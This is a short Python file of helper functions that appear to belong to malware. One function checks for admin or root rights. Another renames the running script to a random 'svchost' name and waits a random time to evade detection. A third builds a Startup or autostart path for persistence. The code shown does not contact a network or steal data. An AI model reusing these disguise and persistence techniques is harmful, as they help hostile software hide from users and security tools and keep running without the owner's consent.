import os, sys, random, time, subprocess, ctypes
from pathlib import Path

def is_admin():
    """Vérifie si le script est lancé avec des droits Administrateur/Root"""
    try:
        if os.name == 'nt': # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else: # Linux
            return os.getuid() == 0
    except AttributeError:
        return False

def evade_detection():
    try:
        os.rename(sys.argv[0], f"svchost{random.randint(1000,9999)}.py")
    except: pass
    time.sleep(random.uniform(0.5, 2.0))

def clear_screen():
    subprocess.run(['cls' if os.name == 'nt' else 'clear'], 
                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def simulate_persistence():
    if os.name == 'nt':
        return os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.py")
    return Path.home() / ".config/autostart/svchost.service"
